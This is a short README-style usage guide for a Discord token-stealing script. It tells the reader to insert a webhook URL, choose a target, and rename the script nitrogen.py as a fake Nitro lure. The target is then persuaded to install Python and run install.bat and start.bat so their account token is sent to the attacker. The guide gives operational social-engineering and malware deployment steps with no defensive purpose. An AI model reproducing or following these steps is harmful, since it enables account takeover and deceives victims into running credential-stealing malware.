## How to use?

1.Open tokengrabber.py by notepad.
2.Go to line 184 and column 26 and paste your webhook url.
3.Find a user you want to target.
4.Change the file tokengrabber.py to nitrogen.py
5.Told them to install [python](https://www.python.org/downloads/release/python-3125/) first.
6.Told them to run install.bat and if done told them run start.bat
7.You will get the token of user you targeted.
